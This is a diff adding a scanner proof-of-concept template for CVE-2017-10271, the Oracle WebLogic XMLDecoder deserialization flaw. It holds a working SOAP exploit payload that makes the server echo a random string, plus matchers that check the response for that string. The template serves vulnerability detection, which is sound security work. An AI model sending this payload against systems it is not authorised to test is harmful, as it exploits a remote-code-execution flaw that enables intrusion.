@@ -1,0 +1,58 @@
+[info]
+author = "ave"
+description = "通过向 /wls-wsat/CoordinatorPortType 发送特制 SOAP XML 数据包，利用 XMLDecoder 反序列化漏洞使服务器回显随机字符串，检测响应中是否包含该字符串以判断漏洞是否存在"
+id = "POC-AVE-2017-0200"
+name = "Oracle WebLogic Server XMLDecoder反序列化远程代码执行漏洞 PoC"
+severity = "high"
+tags = [
+    "cve-2017-10271",
+    "weblogic",
+    "rce",
+    "deserialization",
+]
+vuln_id = [
+    "CVE-2017-10271",
+    "AVE-2017-0200",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/wls-wsat/CoordinatorPortType"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
+  <soapenv:Header>
+    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
+      <java>
+        <void class="java.lang.Thread" method="currentThread">
+          <void method="getCurrentWork">
+            <void method="getResponse">
+              <void method="getServletOutputStream">
+                <void method="flush"/>
+              </void>
+              <void method="getWriter"><void method="write"><string>{{randstr}}</string></void></void>
+            </void>
+          </void>
+        </void>
+      </java>
+    </work:WorkContext>
+  </soapenv:Header>
+  <soapenv:Body/>
+</soapenv:Envelope>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["{{randstr}}"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
